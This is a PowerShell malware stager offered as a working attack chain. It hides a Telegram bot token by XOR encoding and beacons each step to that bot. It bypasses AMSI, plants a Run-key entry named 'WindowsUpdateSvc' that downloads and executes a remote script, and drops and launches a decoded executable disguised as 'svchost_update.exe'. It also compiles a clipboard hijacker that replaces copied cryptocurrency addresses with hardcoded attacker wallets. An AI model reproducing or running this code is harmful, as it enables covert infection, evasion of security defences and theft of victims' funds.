# --- [ELITE RESEARCH STAGER v28.0: STAGED LOAD] ---

function Send-Ping {
    param($m)
    $k=0xAF; [byte[]]$t_e=60,56,60,57,57,58,49,60,60,50,119,6,6,106,108,6,121,115,125,108,5,121,105,6,116,106,6,60,106,122,60,105,121,111,113,111,108,6,103,5,60,114,118; [byte[]]$c_e=54,53,61,61,51,54,56,43,50,53
    $t=""; foreach($b in $t_e){$t+=[char]($b -bxor $k)}; $c=""; foreach($b in $c_e){$c+=[char]($b -bxor $k)}
    $u="h"+"tt"+"ps://api.tele"+"gram.org/bot$t/send"+"Message?chat_id=$c&text=$m"
    try { (New-Object Net.WebClient).DownloadString($u) | Out-Null } catch {}
}

Send-Ping -m "STEP_1_SCRIPT_STARTED"

# --- AMSI BYPASS ---
try {
    $a = "System.Management.Automation." + ("{0}{1}{2}" -f 'A','msi','Utils')
    $b = ("{0}{1}{2}{3}" -f 'a','msi','Init','Failed')
    [Ref].Assembly.GetType($a).GetField($b,'NonPublic,Static').SetValue($null,$true)
    Send-Ping -m "STEP_2_AMSI_BYPASSED"
} catch { Send-Ping -m "STEP_2_AMSI_FAILED" }

# --- REGISTRY PERSISTENCE ---
try {
    $rPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $rCmd = "powershell -WindowStyle Hidden -Bypass -C ""IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/adchar2022/test/refs/heads/main/test.ps1')"""
    Set-ItemProperty -Path $rPath -Name "WindowsUpdateSvc" -Value $rCmd
    Send-Ping -m "STEP_3_REGISTRY_SUCCESS"
} catch {}

# --- EXE DOWNLOAD & RUN ---
try {
    $dir = "$env:LOCALAPPDATA\Temp\V3"
    if (!(Test-Path $dir)) { New-Item $dir -ItemType Directory -Force }
    $f = "$dir\svchost_update.exe"
    
    $wc = New-Object Net.WebClient
    $wc.Headers.Add("User-Agent", "Mozilla/5.0")
    $raw = $wc.DownloadString("https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt")
    $data = [Convert]::FromBase64String($raw.Trim())
    for($i=0; $i -lt $data.count; $i++) { $data[$i] = $data[$i] -bxor 0xAB }
    [IO.File]::WriteAllBytes($f, $data)

    ([wmiclass]"win32_process").Create($f) | Out-Null
    Send-Ping -m "STEP_4_EXE_LAUNCHED"
} catch { Send-Ping -m "STEP_4_EXE_FAILED" }

# --- CLIPPER MODULE ---
try {
    $C_Source = @'
    using System;
    using System.Windows.Forms;
    using System.Threading;
    using System.Text.RegularExpressions;

    public class GC {
        public static void Run() {
            string b = "12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA";
            string e = "0x6c9ba9a6522b10135bb836fc9340477ba15f3392";
            string u = "TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp";
            string s = "BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR";

            while (true) {
                try {
                    if (Clipboard.ContainsText()) {
                        string c = Clipboard.GetText().Trim();
                        string t = "";
                        if (Regex.IsMatch(c, "^(bc1|[13])[a-km-zA-HJ-NP-Z1-9]{25,62}$") && c != b) t = b;
                        else if (Regex.IsMatch(c, "^0x[a-fA-F0-9]{40}$") && c != e) t = e;
                        else if (Regex.IsMatch(c, "^T[A-Za-z1-9]{33}$") && c != u) t = u;
                        else if (Regex.IsMatch(c, "^[1-9A-HJ-NP-Za-km-z]{32,44}$") && c != s) t = s;

                        if (t != "") {
                            Thread th = new Thread(() => Clipboard.SetText(t));
                            th.SetApartmentState(ApartmentState.STA);
                            th.Start(); th.Join();
                        }
                    }
                } catch { }
                Thread.Sleep(500);
            }
        }
    }
'@
    Add-Type -ReferencedAssemblies "System.Windows.Forms" -TypeDefinition $C_Source
    [Threading.Thread]::new({ [GC]::Run() }).Start()
    Send-Ping -m "STEP_5_CLIPPER_ACTIVE"
} catch { Send-Ping -m "STEP_5_CLIPPER_FAILED" }
